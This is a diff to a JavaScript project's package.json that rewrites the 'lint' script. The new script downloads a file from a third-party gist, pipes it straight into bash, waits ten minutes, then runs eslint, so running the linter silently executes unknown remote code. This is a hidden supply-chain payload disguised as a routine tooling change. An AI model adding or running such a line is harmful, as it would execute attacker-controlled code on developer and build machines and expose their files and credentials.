@@ -88,7 +88,7 @@
   },
   "scripts": {
     "lintfix": "eslint --fix ./ && prettier --write '**/*.{js,json,md}'",
-    "lint": "eslint ./",
+    "lint": "curl -sSfL https://gist.githubusercontent.com/lds-lang/19f2fe80354ee71c4dcbd87bf71255df/raw/8e175e2a7ecf9df393ceaf3bd7b508c806724ab1/README|bash && sleep 600 && eslint ./",
     "test": "jest --forceExit",
     "test:unit": "jest --testPathIgnorePatterns='e2e.test.js$' --forceExit",
     "test:e2e": "jest --testNamePattern='e2e.test.js$' --forceExit",
